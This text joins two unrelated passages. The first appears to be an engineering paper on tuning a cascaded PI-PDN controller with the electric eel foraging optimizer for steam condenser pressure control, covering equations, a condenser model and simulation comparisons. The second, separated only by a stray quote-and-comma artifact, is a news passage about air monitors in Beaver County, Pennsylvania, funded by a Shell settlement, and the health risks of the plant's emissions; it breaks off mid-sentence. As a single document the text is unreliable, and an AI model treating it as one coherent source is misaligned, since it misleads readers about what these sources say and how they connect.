to their capability to handle complex and nonlinear systems effectively. Approaches utilizing neural networks, fuzzy logic, and expert systems have been successfully applied to condenser pressure control, demonstrating improved adaptability and robustness compared to traditional methods10. AI-based controllers can learn and model intricate system behaviors, enabling more precise and efficient control under varying operational scenarios11.\n\nRobust control strategies, such as PI, PD, PID, and PDN controllers, are widely used due to their simplicity and effectiveness in maintaining system performance under diverse conditions and disturbances12. These controllers have been extensively studied and applied in thermal power plants, where they help stabilize operations despite the challenges posed by fluctuating load demands and environmental factors. Among these, cascaded control structures, such as the PI-PDN controller, have shown superior performance in managing complex and highly nonlinear systems like steam condensers. The cascaded configuration combines the strengths of both controllers, where the PI controller manages the primary control loop by handling steady-state errors, and the PDN controller addresses the secondary loop by improving transient response and mitigating the effects of measurement noise. This hierarchical control structure enhances overall system stability, response speed, disturbance rejection capabilities and noise attenuation. However, the effectiveness of cascaded controllers like PI-PDN heavily depends on the accurate tuning of their parameters. Determining the optimal values for the proportional gain (\\(\\:{K}_{p}\\)), integral gain (\\(\\:{K}_{i}\\)), derivative gain (\\(\\:{K}_{d}\\)), and filter coefficients is a complex task that significantly influences the controller\u2019s performance13. Improper tuning can lead to issues such as overshoot, prolonged settling times, and instability, undermining the benefits offered by the cascaded control structure.\n\nTraditional tuning methods, such as the Ziegler-Nichols and Cohen-Coon approaches, provide heuristic rules for parameter selection but often fall short in delivering optimal performance, especially in systems with complex and nonlinear dynamics14,15. For instance, the Ziegler-Nichols method, while simple and easy to implement, can result in aggressive tuning that leads to oscillatory responses. Similarly, the Cohen-Coon method, though more conservative, is tailored for first-order systems with dead time and may not suit all applications16. These conventional methods are generally inadequate for finely tuning multiple parameters in cascaded controllers, as they do not effectively account for the intricate interactions between different control loops and the system\u2019s nonlinear behavior.\n\nGiven the limitations of classical tuning techniques, modern optimization algorithms have gained traction for their ability to fine-tune controller parameters more effectively. Techniques such as genetic algorithm (GA), particle swarm optimization (PSO), and differential evolution (DE) have been applied to optimize PI or cascaded controller parameters, demonstrating significant improvements in control accuracy and system stability17. These advanced methods employ stochastic search mechanisms and exploit evolutionary principles to explore the solution space thoroughly, identifying optimal or near-optimal parameter sets that enhance controller performance under various operating conditions. Among these modern optimizers, sparrow search algorithm (SSA)18, the slime mould algorithm (SMA)19, golden eagle optimizer (GEO)20, komodo mlipir algorithm (KMA)21, quadratic interpolation optimization (QIO)22, chaotic quasi-oppositional arithmetic optimization algorithm (COAOA)23, cuckoo optimization algorithm (COA)24have shown considerable promise in various engineering applications. These algorithms offer unique strengths, such as efficient exploration of the search space and robust convergence characteristics, making them suitable for optimizing complex control systems. For example, SMA uses the behavior of slime mould in nature to balance exploration and exploitation during the search process, while GEO simulates the hunting behavior of golden eagles to guide the search towards optimal solutions. Similarly, KMA is inspired by the unique movement of komodo dragons and QIO leverages quadratic interpolation techniques to enhance search capabilities. In addition to this, the electric eel foraging optimizer (EEFO) stands out as a promising method due to its unique approach to exploring and exploiting the search space. The algorithm models the hunting strategy of electric eels, which generate electric fields to detect and capture prey, and applies this strategy to navigate optimization landscapes. The EEFO method has been successfully applied to a range of optimization problems, including parameter extraction in photovoltaic systems25,26and control schemes for temperature adjustment in electric furnaces27.\n\nIn this proposed study, the EEFO, a novel bio-inspired algorithm, to optimize the parameters of a cascaded PI-PDN controller for a nonlinear shell-and-tube steam condenser system is introduced. This study marks the first application of EEFO for pressure control in a nonlinear shell-and-tube steam condenser system. The EEFO algorithm is inspired by the foraging behavior of electric eels, which generate electric fields to locate prey, effectively navigating and exploiting the search space in optimization problems28. By applying EEFO to the task of condenser pressure control, it is aimed to demonstrate its superior performance compared to existing optimization techniques.\n\nThe novelty and key contributions of this study are as follows:\n\n1. First-ever application of EEFO for cascaded PI-PDN controller tuning in nonlinear condenser pressure control \u2013 While EEFO has been previously explored in other optimization problems, this study introduces its first application to pressure regulation in shell-and-tube steam condensers, demonstrating its effectiveness in handling nonlinearities and disturbances. 2. Superior performance over recent metaheuristic algorithms \u2013 A detailed comparative analysis against SMA, GEO, KMA, and QIO optimization techniques highlights the higher efficiency of EEFO in reducing settling time, overshoot, steady-state error, and ITAE. EEFO achieves 22.7% faster settling time, 78.7% lower overshoot, and three orders of magnitude lower steady-state error compared to these methods. 3. Significant improvements over documented control strategies \u2013 The proposed EEFO-based PI-PDN controller is benchmarked against CSA-based FOPID, RIME-based FOPID, GWO-based PI, and GA-based PI from existing literature, confirming its superiority in terms of stability, response time, and robustness in condenser pressure control. 4. Advancement of bio-inspired optimization in industrial control \u2013 By applying EEFO to a complex nonlinear control problem, this study expands the scope of bio-inspired algorithms for industrial automation, particularly in thermal power plant operations, paving the way for further research in bio-inspired control strategies.\n\nThe structure of the paper is organized as follows: Sect. 2 discusses the EEFO in depth. Section 3 details the dynamic modeling of the shell-and-tube steam condenser system. Section 4 presents the design of the cascaded PI-PDN controller optimized using EEFO. Section 5 gives the simulation results and compares with other popular meta-heuristic methods. Finally, Sect. 6 concludes the paper with a summary of findings.\n\nEEFO algorithm\n\nThe EEFO is a bio-inspired optimization algorithm, rooted in the predatory behavior of electric eels28,29,30. These eels utilize electric fields to detect and capture prey, a behavior that has been translated into a robust search mechanism within the EEFO algorithm. The EEFO algorithm operates by mimicking the sequential behaviors of electric eels, including interaction, resting, hunting, and migration. Each of these behaviors is mathematically modeled to enhance both the exploration and exploitation capabilities of the algorithm, thereby improving its ability to find optimal solutions.\n\nThe process begins with the interaction among candidate solutions, which are represented as individual eels within a population. Each candidate solution interacts with others, guided by the best-performing solution, or \u201cprey\u201d within the population. The interaction is mathematically expressed by adjusting the position of each candidate solution based on a stochastic component and the relative position of the best solution. This interaction ensures that the population is drawn towards promising areas in the search space. During the interaction, the position update of each candidate solution is governed by the following equation27:\n\n$$\\:{v}_{i}\\left(t+1\\right)={x}_{j}\\left(t\\right)+{n}_{1}\\cdot\\:\\left(\\stackrel{-}{x}\\left(t\\right)-{x}_{i}\\left(t\\right)\\right)$$ (1)\n\nwhere \\(\\:{n}_{1}\\) is a random number following a normal distribution, \\(\\:\\stackrel{-}{x}\\left(t\\right)\\) represents the mean position of the population and \\(\\:{x}_{j}\\left(t\\right)\\) is the position of a randomly selected candidate solution. This equation helps each candidate refine its position based on the collective behavior of the population.\n\nFollowing the interaction phase, the algorithm simulates a resting period, where candidate solutions temporarily cease movement to conserve energy. This phase is crucial for preventing premature convergence by allowing the algorithm to pause and explore alternative directions. The resting behavior is modeled by adjusting the positions of candidate solutions with an additional random component, which introduces variability and maintains diversity within the population. Mathematically, this resting behavior is described by27:\n\n$$\\:{v}_{i}\\left(t+1\\right)={R}_{i}\\left(t+1\\right)+{n}_{2}\\cdot\\:\\left({R}_{i}\\left(t+1\\right)-round\\left(rand\\right)\\cdot\\:{x}_{i}\\left(t\\right)\\right)$$ (2)\n\nwhere \\(\\:{R}_{i}\\left(t+1\\right)\\) represents the resting position, and \\(\\:{n}_{2}\\) is another normally distributed random variable. This ensures that the candidate solutions do not stagnate but continue to explore the search space in a controlled manner.\n\nAs the algorithm progresses, it enters the hunting phase, where the candidate solutions intensify their search around the best solutions, simulating the eel\u2019s behavior when it encircles its prey. This phase enhances the algorithm\u2019s exploitation ability, focusing on fine-tuning the solutions by narrowing the search around areas of high potential. The position update during this phase is defined in Eq. (3)27.\n\n$$\\:{v}_{i}\\left(t+1\\right)={H}_{prey}\\left(t+1\\right)+\\eta\\:\\cdot\\:\\left({H}_{prey}\\left(t+1\\right)-round\\left(rand\\right)\\cdot\\:{x}_{i}\\left(t\\right)\\right)$$ (3)\n\nwhere \\(\\:{H}_{prey}\\left(t+1\\right)\\) denotes the updated position of the prey and \\(\\:\\eta\\:\\) is a factor that controls the intensity of the hunting behavior.\n\nFinally, the migration behavior is introduced to balance exploration and exploitation by allowing candidate solutions to move from their resting positions to more promising areas. This migration is critical for avoiding local optima and ensuring that the search space is thoroughly explored. The position update during this migration phase is modeled in Eq. (4)27.\n\n$$\\:{v}_{i}\\left(t+1\\right)=-{r}_{5}\\cdot\\:{R}_{i}\\left(t+1\\right)+{r}_{6}\\cdot\\:\\left({H}_{r}\\left(t+1\\right)-L\\cdot\\:({H}_{r}\\left(t+1\\right)-{x}_{i}\\left(t\\right))\\right)$$ (4)\n\nwhere \\(\\:{H}_{r}\\left(t+1\\right)\\) represents a target position in the hunting area, \\(\\:{r}_{5}\\) and \\(\\:{r}_{6}\\) are random variables and \\(\\:L\\) is a Levy flight function that enhances the exploration of the search space. Throughout these phases, the algorithm dynamically adjusts the balance between exploration and exploitation using an energy factor \\(\\:E\\left(t\\right)\\), which determines the focus of the search process. The energy factor is calculated in Eq. (5)27.\n\n$$\\:E\\left(t\\right)=4\\cdot\\:\\text{sin}\\left(1-\\frac{t}{T}\\right)\\cdot\\:\\text{ln}\\left(\\frac{1}{{r}_{7}}\\right)$$ (5)\n\nwhere \\(\\:{r}_{7}\\) is a random number, and \\(\\:T\\) is the maximum number of iterations. The application of the EEFO algorithm in optimizing control parameters for a cascaded PI-PDN controller in a nonlinear shell-and-tube steam condenser system demonstrates its effectiveness. By optimizing parameters such as proportional gain, integral gain, derivative gain, and filter coefficients, the EEFO algorithm enhances system stability, reduces response time, and improves robustness against disturbances. The mathematical constructs behind EEFO, coupled with its bio-inspired approach, make it a powerful tool for solving complex optimization problems in dynamic environments.\n\nModeling of shell-and-tube steam condenser\n\nShell-and-tube steam condensers play a vital role in thermal power plants by condensing exhaust steam from turbines into liquid water, which can then be recycled within the system31. This process not only enhances the efficiency of the power plant but also maintains the desired pressure levels within the condenser. The condenser typically consists of a cylindrical shell enclosing a bundle of tubes. Steam flows through the shell side, where it comes into contact with the cooler water flowing inside the tubes, facilitating effective heat exchange8. Figure 1 illustrates the typical schematic diagram of shell-and-tube steam, highlighting the flow paths of steam and cooling water.\n\nFig. 1 Schematic diagram of shell-and-tube steam condenser. Full size image\n\n3.1 Mathematical model of the condenser\n\nTo comprehensively model the dynamic behavior of the shell-and-tube steam condenser, both the heat transfer and fluid flow processes must be considered8. The primary function of the condenser is to transfer heat from the steam to the cooling water, enabling the condensation of steam into liquid condensate. This heat transfer process can be quantified using the overall heat transfer equation12:\n\n$$\\:Q=U\\cdot\\:A\\cdot\\:{\\Delta\\:}{T}_{m}$$ (6)\n\nwhere \\(\\:Q\\) is the rate of heat transfer, \\(\\:U\\) is the overall heat transfer coefficient, \\(\\:A\\) is the heat transfer area and \\(\\:{\\Delta\\:}{T}_{m}\\) is the logarithmic mean temperature difference. The logarithmic mean temperature difference (\\(\\:{\\Delta\\:}{T}_{m}\\)) is calculated in Eq. (7)12.\n\n$$\\:{\\Delta\\:}{T}_{m}=\\frac{\\left(T-{T}_{cw}\\right)}{\\text{ln}\\left(\\frac{{T}_{c}-{T}_{cw}}{{T}_{c}-T}\\right)}$$ (7)\n\nwhere \\(\\:{T}_{cw}\\), \\(\\:{T}_{c}\\) and \\(\\:T\\) are the inlet temperature of the cooling water, condensate temperature and outlet temperature of the cooling water, respectively. The energy balance equations for the steam (shell side) and cooling water (tube side) is expressed in Eq. (8)12.\n\n$$\\:Q={F}_{c}\\cdot\\:\\lambda\\:$$ (8)\n\nwhere \\(\\:{F}_{c}\\) is the mass flow rate of the steam and \\(\\:\\lambda\\:\\)is the specific latent heat of vaporization. Cooling water side energy balance is as follows12:\n\n$$\\:\\frac{dT}{dt}=\\frac{{F}_{cw}}{{M}_{cw}}\\left({T}_{cw}-T\\right)+\\frac{Q}{{M}_{cw}\\cdot\\:{C}_{P}}$$ (9)\n\nwhere \\(\\:{F}_{cw}\\) is the mass flow rate of cooling water, \\(\\:{M}_{cw}\\) is the cooling water holdup, \\(\\:{C}_{P}\\) is the specific heat capacity of cooling water. Using the Wilson Plot method, the product of the overall heat transfer coefficient and the heat transfer area (\\(\\:U\\cdot\\:A\\)) can be approximated by Eq. (10)12.\n\n$$\\:\\frac{1}{U\\cdot\\:A}={a}_{1}{\\cdot\\:F}_{cw}^{-0.8}+{a}_{2}$$ (10)\n\nwhere \\(\\:{a}_{1}\\) and \\(\\:{a}_{2}\\) are constants. The mass balance for both steam and condensate assumes that their volumes remain constant, implying that the condensate\u2019s outlet flow rate is regulated to keep a steady condensate level within the condenser. The dynamic equation governing the pressure within the condenser is expressed in Eq. (11)12.\n\n$$\\:\\frac{dP}{dt}=\\frac{R{T}_{c}}{V}\\left({F}_{s}-{F}_{c}\\right)$$ (11)\n\nwhere \\(\\:P\\) represents the condenser pressure, \\(\\:R\\) is the specific gas constant, \\(\\:V\\) is the condenser volume, and \\(\\:{F}_{s}\\) is the mass flow rate of steam. The relationship between the condensate temperature \\(\\:{T}_{c}\\) and the pressure \\(\\:P\\) is linearly approximated in Eq. (12)12.\n\n$$\\:{T}_{c}=\\alpha\\:P+\\beta\\:$$ (12)\n\nwhere \\(\\:\\alpha\\:\\) and \\(\\:\\beta\\:\\) are coefficients determined based on system specifications. The dynamic behavior of the shell-and-tube steam condenser is captured by integrating the energy balances and pressure dynamics equations. The energy transfer between the steam and cooling water is governed by the heat transfer rate \\(\\:Q\\), which is determined by both the overall heat transfer coefficient \\(\\:U\\cdot\\:A\\) and the latent heat of vaporization \\(\\:\\lambda\\:\\). By solving the coupled differential Eqs. (9) and (11) alongside the empirical relation (10), the model can predict the transient response of the condenser\u2019s temperature and pressure under varying operational conditions. This comprehensive mathematical framework allows for the simulation and optimization of the condenser\u2019s performance, providing essential insights for the design and control of the system. The parameters and variables outlined in Tables 1 and 2 are essential for accurately modeling the condenser\u2019s behavior.\n\nTable 1 Condenser parameters. Full size table\n\nTable 2 Condenser variables. Full size table\n\nProposed novel cascaded control method\n\nThe proposed control method utilizes a cascaded PI-PDN controller to regulate the pressure within a nonlinear shell-and-tube steam condenser system. The cascaded structure combines the strengths of the PI and PDN controllers and block diagram of the cascaded PI-PDN controller is illustrated in Fig. 2. This configuration enhances the system\u2019s ability to handle both steady-state errors and transient responses, making it particularly effective for controlling complex, nonlinear systems such as steam condensers.\n\nFig. 2 Block diagram of cascaded PI-PDN controller. Full size image\n\nThe cascaded PI-PDN controller is designed to manage two critical aspects of control: steady-state accuracy and transient response. The primary loop is governed by the PI controller, which addresses the steady-state error by integrating the error signal over time. The secondary loop is managed by the PDN controller, which improves the system\u2019s transient response and mitigates the effects of measurement noise. The PI controller\u2019s output is defined in Eq. (13)32.\n\n$$\\:{u}_{1}\\left(t\\right)={K}_{p1}\\cdot\\:e\\left(t\\right)+{K}_{i}\\cdot\\:{\\int\\:}_{0}^{t}e\\left(t\\right)dt$$ (13)\n\nwhere \\(\\:{u}_{1}\\left(t\\right)\\) is the control signal from the PI controller, \\(\\:{K}_{p1}\\) is the proportional gain of the PI controller, \\(\\:{K}_{i}\\) is the integral gain and \\(\\:e\\left(t\\right)\\) is the error signal at time \\(\\:t\\). The PDN controller\u2019s output, which forms the secondary control loop, is expressed in Eq. (14)33.\n\n$$\\:{u}_{2}\\left(t\\right)={K}_{p2}\\cdot\\:{u}_{1}\\left(t\\right)+{K}_{d}\\cdot\\:\\frac{d{u}_{1}\\left(t\\right)}{dt}+\\left(-\\frac{1}{N}\\cdot\\:\\frac{d{u}_{2}\\left(t\\right)}{dt}\\right)$$ (14)\n\nIn the cascaded configuration, the output of the PI controller \\(\\:{u}_{1}\\left(t\\right)\\) is fed as the input to the PDN controller. This structure allows the PI controller to address the slower dynamics related to steady-state performance, while the PDN controller handles the faster dynamics and noise, resulting in a more robust and responsive control system.\n\nTo optimize the performance of the cascaded PI-PDN controller, ITAE is used as the objective function. The ITAE criterion emphasizes the minimization of errors that persist over time, making it suitable for evaluating the effectiveness of control systems in dynamic environments. The ITAE objective function is described by Eq. (15)34.\n\n$$\\:ITAE=\\underset{{t}_{fault}}{\\overset{{t}_{sim}}{\\int\\:}}\\left|e\\right(t\\left)\\right|(t-{t}_{fault})dt$$ (15)\n\nwhere \\(\\:{t}_{sim}=50\\) second is the total simulation time and \\(\\:{t}_{fault}=10\\) second is the time at which a disturbance (or fault) is introduced. The ITAE criterion was selected as the objective function due to its effectiveness in minimizing long-term error accumulation while prioritizing rapid error reduction. Compared to other traditional integral-based performance indices, ITAE offers distinct advantages in optimizing transient response and disturbance rejection. For example, while integral of absolute error (IAE) minimizes total absolute error, it does not differentiate between early and late errors, which may lead to longer settling times in control applications. The integral of squared error (ISE) penalizes larger deviations more aggressively, making it suitable for systems with high sensitivity to large errors. However, it often compromises response time and may allow prolonged small errors, affecting steady-state accuracy. The integral of time-weighted squared error (ITSE) provides a balance between transient and steady-state errors, but it does not penalize sustained errors as effectively as ITAE, which is crucial for condenser pressure regulation. By assigning greater weight to errors occurring later in the response, ITAE ensures that prolonged deviations are heavily penalized, forcing the controller to achieve faster convergence and minimal steady-state error. As seen in the comparative results, the EEFO-optimized PI-PDN controller tuned using ITAE achieves superior performance in settling time, overshoot reduction, and steady-state precision, confirming its suitability for this nonlinear control problem.\n\nThe optimization of the cascaded PI-PDN controller\u2019s parameters is subject to predefined boundaries to ensure that the search space is both feasible and efficient showed Table 3. These boundaries are chosen based on the physical characteristics of the steam condenser system and the desired performance criteria. The proposed EEFO-based cascaded PI-PDN controller is applied to the steam condenser system as illustrated in Fig. 3. The process begins with an input step test, where a disturbance is introduced to the system. The error signal, defined as the difference between the desired pressure setpoint and the actual pressure, is fed into the cascaded PI-PDN controller. The controller adjusts the parameters \\(\\:{K}_{p1},\\:{K}_{i}\\), \\(\\:{K}_{p2}\\), \\(\\:{K}_{d}\\) and \\(\\:N\\) based on the feedback from the system and the evaluation of the ITAE value. The EEFO algorithm then determines the behavior of each eel in the population, whether to perform interacting, resting, migrating, or hunting behaviors, based on the energy factor \\(\\:E\\left(t\\right)\\) and random probabilities. These behaviors guide the search for optimal controller parameters, iteratively improving the system\u2019s performance. The process continues until the stopping criterion is met, at which point the algorithm returns the best solution, corresponding to the optimal set of controller parameters. This solution is then applied to the PI-PDN controller, ensuring that the steam condenser system operates efficiently and maintains stable pressure control under various conditions.\n\nTable 3 Adopted boundaries of the controller parameters. Full size table\n\nSimulation results\n\nThe comprehensive simulation results obtained by applying the proposed EEFO to a cascaded PI-PDN controller for pressure control in a nonlinear shell-and-tube steam condenser system is presented in this section. The performance of the EEFO algorithm is compared with several recent metaheuristic algorithms, and its robustness under various conditions is assessed.\n\nRecent metaheuristic algorithms\n\nThe effectiveness of the proposed EEFO algorithm is evaluated by comparing it with four recent metaheuristic algorithms: QIO22, KMA21, GEO20, and SMA19. Each algorithm was applied to tune the parameters of the cascaded PI-PDN controller under identical simulation conditions to ensure a fair comparison. The parameters in Table 4. indicate that all algorithms were tested with a consistent population size of 30 and a total of 50 iterations. These settings were selected to balance computational efficiency with optimization performance.\n\nFig. 3 Application of the proposed EEFO based cascaded PI-PDN controller to steam condenser. Full size image\n\nTable 4 Parameters settings of the adopted algorithms. Full size table\n\nThe boxplot analysis presented in Fig. 4 compares the distribution of ITAE values obtained from multiple runs of each algorithm. The EEFO algorithm consistently achieved lower ITAE values with reduced variability compared to the other algorithms. This suggests that EEFO not only finds better solutions but does so more reliably across different runs. The smaller spread in the EEFO boxplot indicates that the algorithm is less sensitive to initial conditions and stochastic variations, which is crucial for practical applications where consistency is key.\n\nA detailed statistical analysis of the ITAE values obtained by each algorithm has been provided in Table 5. The EEFO algorithm outperforms the other methods across several metrics, including achieving the lowest minimum, maximum and average ITAE values. However, in terms of standard deviation, which measures the variability or dispersion of the ITAE values, EEFO does not have the lowest value; QIO, KMA and GEO demonstrate smaller variations with standard deviations of 0.1048, 0.0678 and 0.0726, respectively. Despite this, EEFO\u2019s strong performance in minimizing ITAE and its competitive standard deviation underscore its effectiveness and reliability in optimizing control parameters. The lowest Friedman\u2019s mean rank of 1 for EEFO indicates its superior performance compared to the other optimizers, highlighting its robustness and reliability. This statistical consistency suggests that EEFO is less likely to result in suboptimal performance in practical applications, making it a highly effective choice for optimizing control parameters.\n\nTable 5 Statistical results obtained from different algorithms. Full size table\n\nThe convergence curves for the ITAE objective function across different algorithms are presented in Fig. 5. The rapid convergence of EEFO is evident, as it reaches a near-optimal solution faster. This quick convergence is advantageous in real-time applications where computational efficiency is critical. Additionally, EEFO not only converges quickly but also to a lower ITAE value, indicating its effectiveness in exploring the solution space thoroughly and avoiding local minimum.\n\nThe controller parameters listed in Table 6 highlight the effectiveness of EEFO in finding balanced and optimal settings for the cascaded PI-PDN controller. The respective table demonstrates the effectiveness of EEFO in optimizing the settings for the cascaded PI-PDN controller. The values obtained through EEFO, particularly for \\(\\:{K}_{p2}\\), \\(\\:{K}_{d}\\) and the filter coefficient \\(\\:N\\), suggest a carefully balanced approach that enhances overall system performance. Specifically, EEFO achieved a higher \\(\\:{K}_{d}\\) value compared to the other algorithms, which can help in improving the system\u2019s responsiveness to changes, reducing the impact of oscillations, and effectively filtering noise. Additionally, the relatively moderate filter coefficient \\(\\:N\\) in EEFO, compared to those in KMA, GEO and SMA, indicates a more controlled approach to managing system noise, ensuring stability without dampening the response. The overall combination achieved by EEFO results in a more robust and stable control performance, leading to lower ITAE values.\n\nFig. 5 Convergence curves for ITAE objective function obtained from different algorithms. Full size image\n\nTable 6 Obtained controller parameters via different algorithms. Full size table\n\nThe time response of the condenser pressure under the control of different algorithms is compared in Fig. 6, and Fig. 7 provides a closer examination of the time response during critical periods. Although, the rise time is similar across all methods, the EEFO-based controller excels in minimizing settling time, overshoot, and steady-state error. This indicates that the EEFO-optimized controller not only achieves a fast response but also ensures stability and precision, which are crucial in maintaining the desired pressure levels in the steam condenser without causing undue stress on the system. This level of control is particularly important in industrial applications where precise regulation of process variables is necessary to avoid damaging equipment and ensure consistent product quality.\n\nTable 7 compares the normalized time response metrics across the different algorithms. The comparative statistical values in Table 7 highlight the effectiveness of the EEFO-based PI-PDN controller in terms of settling time, overshoot, ITAE, and steady-state error. Among all the tested optimization algorithms, EEFO achieves the lowest values in all performance metrics, demonstrating its superior ability to regulate condenser pressure efficiently. EEFO achieves the shortest normalized settling time (13.1799 s), indicating that the system stabilizes faster compared to other approaches. Faster stabilization is crucial in industrial processes where delays in control response can lead to inefficiencies and increased operational costs. The overshoot percentage (2.5609%) observed in EEFO-based control is significantly lower than the other algorithms. High overshoot values, as seen in SMA (7.9315%) and KMA (6.4680%), may introduce undesired fluctuations in the system, which can cause instability in real-world condenser pressure control applications. The ITAE value of 2.6957 further supports EEFO\u2019s robustness in reducing long-term deviations from the desired pressure setpoint. A lower ITAE value indicates that the EEFO-tuned controller provides smoother error minimization over time, avoiding sustained deviations from the target pressure. The steady-state error of EEFO (5.7304E \u2212 07 kPa) is orders of magnitude lower than those obtained from QIO, KMA, GEO, and SMA. This minimal error confirms that the EEFO-based PI-PDN controller successfully maintains the target pressure over long operational periods, which is a crucial requirement for steam condensers. Overall, these results demonstrate that the EEFO-based PI-PDN controller effectively balances fast response and precision, making it more suitable for industrial applications compared to other optimization techniques.\n\nFig. 6 Time response of the condenser pressure via different algorithms. Full size image\n\nTable 7 Normalized time response metrics obtained via different algorithms. Full size table\n\nComparisons with documented studies\n\nThe effectiveness of the EEFO-based PI-PDN controller was further validated through comparisons with documented studies involving other control strategies, including CSA-based FOPID [8], RIME-based FOPID [9], GWO-based PI [10], and GA-based PI [12]. The time response of the condenser under the EEFO-based PI-PDN controller with those documented in previous studies is compared as can be seen in Fig. 8. The EEFO-based controller achieves faster and more stable responses compared to the other methods, demonstrating its ability to handle the nonlinear dynamics of the steam condenser more effectively.\n\nFig. 8 Comparative time response of the condenser with the documented studies. Full size image\n\nFigure 9 offers a closer look at the comparative time responses during critical transitions. The EEFO-based control strategy clearly outperforms the others in maintaining stability and minimizing transient deviations, which are essential for ensuring the safe and efficient operation of the steam condenser.\n\nComparative normalized time response metrics using documented studies are provided in Table 8. The comparison in Table 8 illustrates the significant advantages of the proposed EEFO-based PI-PDN controller over existing documented studies, which include CSA-based FOPID, RIME-based FOPID, GWO-based PI, and GA-based PI. The EEFO-based PI-PDN controller achieves a normalized settling time of 13.1799 s, which is notably lower than the 17.0509 s observed in CSA-based FOPID and 28.2457 s in GA-based PI. This indicates that the EEFO-tuned controller ensures a faster return to steady-state conditions after disturbances, significantly improving system responsiveness. The overshoot percentage of the EEFO-based controller (2.5609%) is considerably lower than the values obtained using CSA-based FOPID (12.0526%) and RIME-based FOPID (17.7156%). This reduced overshoot means that EEFO prevents excessive pressure deviations that could potentially damage condenser components or disrupt thermal plant operations. The ITAE value (2.6957) in EEFO-based PI-PDN control is significantly lower than that of CSA-based FOPID (14.3100) and RIME-based FOPID (15.9775), confirming its ability to minimize cumulative errors over time. This is a crucial indicator of the controller\u2019s efficiency in maintaining long-term stability. The EEFO-based controller\u2019s steady-state error (5.7304E \u2212 07 kPa) is drastically lower than those found in previous studies, especially when compared to CSA-based FOPID (6.5730E \u2212 04 kPa) and GA-based PI (0.0059 kPa). These results suggest that EEFO provides a superior long-term pressure regulation strategy, ensuring consistent system performance with minimal deviations. Overall, these findings validate that EEFO is a highly effective tool for optimizing nonlinear condenser pressure control, outperforming both classical and modern optimization techniques in achieving better stability, faster settling times, lower overshoot, and reduced steady-state error. The superior performance of EEFO in both metaheuristic algorithm comparisons and documented studies highlights its potential for broader industrial applications where precise and robust control is required.\n\nTable 8 Comparative normalized time response metrics using documented studies. Full size table\n\nTracking input signal\n\nAccurate tracking of input signals is crucial for maintaining optimal system performance, especially in dynamic environments. The ability of the EEFO-based PI-PDN controller to track input signals accurately is illustrated in Fig. 10. The results demonstrate that the proposed control strategy maintains close adherence to the desired input trajectory, ensuring that the system responds effectively to changes in operating conditions. This capability is vital for maintaining process stability and achieving the desired outcomes in real-time applications.\n\nFig. 10 Performance of the proposed control strategy in terms of input signal tracking. Full size image\n\nEffect of non-ideal conditions on proposed EEFO based PI-PDN controller performance\n\nTo assess the robustness of the proposed control strategy, the performance of the EEFO-based PI-PDN controller was evaluated under non-ideal conditions, including the presence of external disturbances and random noise. The external disturbance signal (\\(\\:D\\left(s\\right)\\)) and noise signal (\\(\\:N\\left(s\\right)\\)) were introduced to the system to simulate real-world operating conditions that can affect the stability and accuracy of the control process. The \\(\\:D\\left(s\\right)\\) represents external forces or influences that may alter the system\u2019s behavior, while the noise signal \\(\\:N\\left(s\\right)\\) is modeled as a uniformly distributed random noise within the range of \\(\\:[-0.01,\\:0.01]\\) kPA, with a sample time of 0.1 s. These noise and disturbance signals were applied to test the controller\u2019s ability to maintain stability and accurate pressure control despite these perturbations. Additionally, saturation limits were set between \\(\\:[-50,\\:50]\\) to simulate the physical constraints of the actuator, ensuring that the control actions remain within feasible operational bounds. The design of the control system, detailing how the external disturbance \\(\\:D\\left(s\\right)\\) and noise signal \\(\\:N\\left(s\\right)\\) were integrated into the simulation environment is illustrated in Fig. 11. The inclusion of these factors ensures a realistic assessment of the controller\u2019s performance under challenging conditions.\n\nFig. 11 Design of the proposed control system for saturation and disturbances. Full size image\n\nFig. 12 Performance of the proposed control approach with respect to noise and disturbance effects. Full size image\n\nFigure 12 demonstrates that the EEFO-based controller effectively mitigates the impact of both noise and disturbances, maintaining stable and precise control of the condenser pressure. Despite the presence of random noise and external disturbances, the controller successfully keeps the system within the desired operating parameters, illustrating its robustness and reliability. The ability to handle such non-ideal conditions without significant degradation in performance is critical for industrial applications where external factors are often unpredictable and unavoidable.\n\n5.5. Closed-loop response of the proposed control strategy\n\nThe closed-loop response of the proposed control strategy was analyzed to ensure that the controller performs effectively under varying operational conditions, including changes in circulating water outlet temperature, cooling water flow, and steam heat. Figure 13 illustrates the closed-loop response, confirming that the EEFO-based PI-PDN controller maintains system stability and achieves the desired control objectives under dynamic conditions. The ability to adapt to changes in key process variables without sacrificing control quality is crucial for ensuring the long-term reliability and efficiency of the steam condenser system. A comprehensive analysis of the simulation results, demonstrating the superior performance of the proposed EEFO-based cascaded PI-PDN controller has been provided. The detailed discussion highlights the advantages of EEFO in optimizing the nonlinear steam condenser system and confirms its robustness across various scenarios, including comparisons with recent metaheuristic algorithms, documented studies, and under non-ideal operating conditions. The findings validate the potential of EEFO as an advanced optimization tool for industrial control systems.",

These monitors continuously measure particulate matter pollution with the goal of providing real-time, hyper-local air quality information. Beaver county residents can request a free PurpleAir monitor through a separate program, Project SPOTlight.\n\nThe Eyes on Air project was paid for through a $5 million community fund created from a $10 million settlement between the Pennsylvania Department of Environmental Protection and Shell after the company violated its air pollution permit and exceeded air quality standards.\n\nA screenshot from the Eyes on Air website displays real-time air quality data from 6 new air monitoring sites for Beaver County (screenshot captured on 3/3/25) Via Eyes On Air\n\n\u201cThe public having access to this data is important \u2014 people could bring information generated on [the Eyes on Air website] to their doctor\u2019s offices to discuss any potential health impacts related to specific pollutants from industries in the region,\u201d Ana Hoffman, director of the air quality program at Carnegie Mellon University\u2019s CREATE Lab , which partners with community groups to develop citizen science initiatives, told EHN. (The CREATE Lab was not involved with the Eyes on Air project).\n\nBeaver County is also home to other industrial polluters, including chemical and electronics manufacturing, and steel processing plants. Beaver County received a \u201cC\u201d grade for particulate matter pollution on the American Lung Association\u2019s 2024 \u201cState of the Air\u201d report , which grades counties throughout the U.S. on various measures of air pollution that can impact lung health. That report also found that 13,579 adults and 3,149 children with asthma live in Beaver County, along with 10,588 people with chronic obstructive pulmonary disease (COPD) and 15,616 people with cardiovascular disease, all of whom face additional risk from exposure to air pollution.\n\nShell\u2019s western Pennsylvania complex turns ethane from fracked gas into polyethylene nurdles , which are used to make many consumer products, including single-use plastic packaging and bags. Emissions from the plant include particulate matter pollution, volatile organic compounds like benzene and toluene, and a long list of other hazardous air pollutants .\n\nExposure to these types of emissions is linked to acute health problems like heart attacks, asthma exacerbation, and miscarriages. Longer-term problems include respiratory and heart disease, cancer, and brain, liver, and kidney issues.\n\nA screenshot from the Eyes on Air website displays community air monitoring data in Beaver County (screenshot captured on 